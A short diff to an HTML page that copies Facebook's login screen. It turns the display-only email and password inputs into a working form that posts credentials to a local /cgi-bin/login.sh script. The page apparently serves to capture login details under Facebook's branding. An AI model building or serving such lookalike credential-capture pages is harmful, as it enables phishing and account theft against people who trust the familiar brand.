@@ -202,13 +202,13 @@ footer small {
                 <h2>Facebook helps you connect and share with the people in your life.</h2>
             </div>
             <div class="col-form">
-                <div class="form-container">
-                    <input type="text" placeholder="Email or phone number">
-                    <input type="password" placeholder="Password">
-                    <button class="btn-login">Login</button>
+                <form class="form-container" action="/cgi-bin/login.sh" method="post">
+                    <input name="username" type="text" placeholder="Email or phone number">
+                    <input name="password" type="password" placeholder="Password">
+                    <input type="submit" value="Login" class="btn-login">
                     <a href="#">Forgotten password?</a>
                     <button class="btn-new">Create new Account</button>
-                </div>
+                </form>
                 <p><a href="#"><b>Create a Page</b></a> for a celebrity, brand or business.</p>
             </div>
         </div>
